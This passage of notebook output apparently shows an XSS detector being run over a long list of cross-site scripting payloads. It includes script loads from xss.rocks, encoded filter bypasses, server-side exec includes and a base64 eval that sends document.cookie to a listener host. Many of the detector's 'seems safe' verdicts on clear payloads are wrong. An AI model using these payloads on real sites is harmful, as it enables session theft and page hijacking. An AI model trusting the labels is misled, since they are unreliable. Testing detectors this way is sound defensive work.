      "Give me some data to work on : <<SCRIPT>alert(\"XSS\");//\\<</SCRIPT>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <SCRIPT SRC=http://xss.rocks/xss.js?< B >\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <SCRIPT SRC=//xss.rocks/.j>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <IMG SRC=\"`<javascript:alert>`('XSS')\"\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <iframe src=http://xss.rocks/scriptlet.html <\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : \\\";alert('XSS');//\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : </script><script>alert('XSS');</script>\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : </TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : <INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <BODY BACKGROUND=\"javascript:alert('XSS')\">\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : <IMG DYNSRC=\"javascript:alert('XSS')\">\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : <IMG LOWSRC=\"javascript:alert('XSS')\">\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : <STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS</br>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <IMG SRC='vbscript:msgbox(\"XSS\")'>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <IMG SRC=\"livescript:[code]\">\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <svg/onload=alert('XSS')>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : Set.constructor`alert\\x28document.domain\\x29```\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <BODY ONLOAD=alert('XSS')>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : onFocus()\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : <BGSOUND SRC=\"javascript:alert('XSS');\">\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : <BR SIZE=\"&{alert('XSS')}\">\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <LINK REL=\"stylesheet\" HREF=\"http://xss.rocks/xss.css\">\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <STYLE>@import'http://xss.rocks/xss.css';</STYLE>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <META HTTP-EQUIV=\"Link\" Content=\"<http://xss.rocks/xss.css>; REL=stylesheet\">\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : <STYLE>BODY{-moz-binding:url(\"http://xss.rocks/xssmoz.xml#xss\")}</STYLE>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : exp/*<A STYLE='no\\xss:noxss(\"*//*\");\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : xss:ex/*XSS*//*/*/pression(alert(\"XSS\"))'>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <STYLE TYPE=\"text/javascript\">alert('XSS');</STYLE>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <STYLE>.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <STYLE type=\"text/css\">BODY{background:url(\"<javascript:alert>('XSS')\")}</STYLE>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <XSS STYLE=\"xss:expression(alert('XSS'))\">\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <XSS STYLE=\"behavior: url(xss.htc);\">\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : ¼script¾alert(¢XSS¢)¼/script¾\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : javascript:alert('XSS')\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : URL=javascript:alert('XSS')\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : SRC=\"javascript:alert('XSS')\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : =\"javascript:alert('XSS')\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : SRC=# onmouseover=\"alert(document.cookie)\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : =# onmouseover=\"alert(document.cookie)\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : <FRAME SRC=\"javascript:alert('XSS')\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : =\"javascript:alert('XSS')\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : avascript:alert('XSS')\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : url(javascript:alert('XSS'))\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : javascript:alert('XSS')\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : =\"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : <DIV STYLE=\"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029\">\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : url(\u0001javascript:alert('XSS')\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : STYLE=\"width: expression(alert('XSS'))\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : xpression(alert('XSS'))\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <SCRIPT>alert('XSS');</SCRIPT>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : HREF=\"javascript:alert('XSS')\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : javascript:alert('XSS')\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : javascript:alert('XSS');\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : YPE=\"text/x-scriptlet\" DATA=\"http://xss.rocks/scriptlet.html\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : YPE=\"text/x-scriptlet\" DATA=\"http://xss.rocks/scriptlet.html\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : SRC=\"http://ha.ckers.org/xss.swf\" AllowScriptAccess=\"always\"\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : AllowScriptAccess=\"always\"\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : RC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : <EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : a=\"get\";\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : b=\"URL(\\\"\";\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : c=\"javascript:\"\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : d=\"alert('XSS');\\\")\"; \n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : d=\"alert('XSS');\\\")\";\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : d=\"alert('XSS');\\\")\"\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : eval(a+b+c+d)\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : javas<!-- -->cript:alert('XSS')\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"></SPAN>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : SRC=\"xsstest.xml\" ID=I\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : DATASRC=#I DATAFLD=C DATAFORMATAS=HTML\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <SCRIPT DEFER>alert(\"XSS\")</SCRIPT>\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\"> <?import namespace=\"t\" implementation=\"#default#time2\"> <t:set attributeName=\"innerHTML\" to=\"XSS<SCRIPT DEFER>alert(\"XSS\")</SCRIPT>\">\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : <SCRIPT SRC=\"http://xss.rocks/xss.jpg\"></SCRIPT>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <!--#exec cmd=\"/bin/echo '<SCR'\"-->\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : <!--#exec cmd=\"/bin/echo 'IPT SRC=http://xss.rocks/xss.js>\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : <!--#exec cmd=\"/bin/echo '<SCR'\"--><!--#exec cmd=\"/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'\"\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : <!--#exec cmd=\"/bin/echo '<SCR'\"--><!--#exec cmd=\"/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'\"-->\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : <? echo('<SCR)'; echo('IPT>alert(\"XSS\")</SCRIPT>'); ?>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <IMG SRC=\"http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode\">\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : echo('IPT>alert(\"XSS\")</SCRIPT>')\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : SRC=\"http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=<SCRIPT>alert('XSS')</SCRIPT>\">\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : <META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=<SCRIPT>alert('XSS')</SCRIPT>\">\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : <SCRIPT>alert('XSS')</SCRIPT>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <HEAD><META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS')\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <HEAD><META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : <SCRIPT a=\">\" SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <SCRIPT =\">\" SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : <SCRIPT a=\">\" '' SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : <SCRIPT \"a='>'\" SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : <SCRIPT a=`>` SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <SCRIPT a=\">'>\" SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : <SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <A HREF=\"http://66.102.7.147/\">XSS</A>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <A HREF=\"http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\">XSS</A>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <A HREF=\"http://1113982867/\">XSS</A>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <A HREF=\"http://0x42.0x0000066.0x7.0x93/\">XSS</A>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <A HREF=\"http://0102.0146.0007.00000223/\">XSS</A>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : 0x42.0x0000066.0x7.0x93/\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : http://1113982867/\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : <img onload=\"eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))\">\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : tt  p://6\t6.000146.0x7.147/\">XSS</A>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <A HREF=\"//www.google.com/\">XSS</A>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <A HREF=\"//google\">XSS</A>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : \n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : <A HREF=\"http://ha.ckers.org@google\">XSS</A>\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : <A HREF=\"http://google:ha.ckers.org\">XSS</A>\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : javascript:document.location='http://www.google.com/\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : javascript:document.location=\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on :  &#X000003C;\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on :  &#x00003C\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : x000003C\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on :  &#x3C\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : <script>  setTimeout(\\\\\"writetitle()\\\\\",$\\_GET\\[xss\\]) </script>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : setTimeout(\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : writetitle()\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : setTimeout(\\\\\"writetitle()\\\\\",$\\_GET\\[xss\\])\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : header('Location: '.$_GET['param']);\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : /?param=<javascript:alert(document.cookie>)\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : ?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : /?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : <Img src = x onerror = \"javascript: window.onerror = alert; throw XSS\">\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <Video> <source onerror = \"javascript: alert (XSS)\">\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <Input value = \"XSS\" type = text>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <applet code=\"javascript:confirm(document.cookie);\">\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <isindex x=\"javascript:\" onmouseover=\"alert(XSS)\">\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : \"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : \"><img src=\"x:x\" onerror=\"alert(XSS)\">\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : \"><iframe src=\"javascript:alert(XSS)\">\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : <object data=\"javascript:alert(XSS)\">\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <isindex type=image src=1 onerror=alert(XSS)>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <img src=x:alert(alt) onerror=eval(src) alt=0>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <img  src=\"x:gif\" onerror=\"window['al\\u0065rt'](0)\"></img>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <iframe/src=\"data:text/html,<svg onload=alert(1)>\">\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <meta content=\"&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)\" http-equiv=\"refresh\"/>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <meta http-equiv=\"refresh\" content=\"0;url=javascript:confirm(1)\">\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <form><a href=\"javascript:\\u0061lert(1)\">X\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : </script><img/*%00/src=\"worksinchrome&colon;prompt(1)\"/%00*/onerror='eval(src)'>\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : <style>//*{x:expression(alert(/xss/))}//<style></style> \n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <img src=\"/\" =_=\" title=\"onerror='prompt(1)'\">\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <script x> alert(1) </script 1=2\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <form><button formaction=javascript&colon;alert(1)>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <input/onmouseover=\"javaSCRIPT&colon;confirm&lpar;1&rpar;\"\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <iframe src=\"data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E\"></iframe>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <OBJECT CLASSID=\"clsid:333C7BC4-460F-11D0-BC04-0080C7055A83\"><PARAM NAME=\"DataURL\" VALUE=\"javascript:alert(1)\"></OBJECT> \n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : (alert)(1)\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : a=alert,a(1)\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : [1].find(alert)\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : top[“al”+”ert”](1)\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : top[/al/.source+/ert/.source](1)\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : al\\u0065rt(1)\n",
      "====================\n",
      "seems safe\n",
      "====================\n",
      "Give me some data to work on : top[‘al\\145rt’](1)\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : top[8680439..toString(30)](1)\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : top[‘al\\x65rt’](1)\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <a id=x tabindex=1 onactivate=alert(1)></a>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <body onafterprint=alert(1)>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out \t\t\t\t\t\t\t\t\t0s 1 x;}</style><a id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></a>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <style>@keyframes x{}</style><a style=\"animation-name:x\" \t\t\t\t\t\t\t\t\tonanimationend=\"alert(1)\"></a>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <style>@keyframes slidein {}</style><a style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" \t\t\t\t\t\t\t\t\tonanimationiteration=\"alert(1)\"></a>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <a id=x tabindex=1 onbeforeactivate=alert(1)></a>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <body onbeforeprint=alert(1)>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <svg><animate onbegin=alert(1) attributeName=x dur=1s>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <audio oncanplay=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <svg><animate onend=alert(1) attributeName=x dur=1s>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <audio src/onerror=alert(1)>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <a onfocusout=alert(1) tabindex=1 id=x></a><input autofocus>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <body onhashchange=\"alert(1)\">\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <svg><a onload=alert(1)></a>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <image src=validimage.png onloadend=alert(1)>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <body onmessage=alert(1)>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <audio autoplay onplaying=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <applet onreadystatechange=alert(1)></applet>\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Give me some data to work on : <body onresize=\"alert(1)\">\n",
      "====================\n",
      " It can be Cross site scripting attack\n",
      "====================\n",
      "Give me some data to work on : <marquee onstart=alert(1)>XSS</marquee>\n",
      "====================\n",
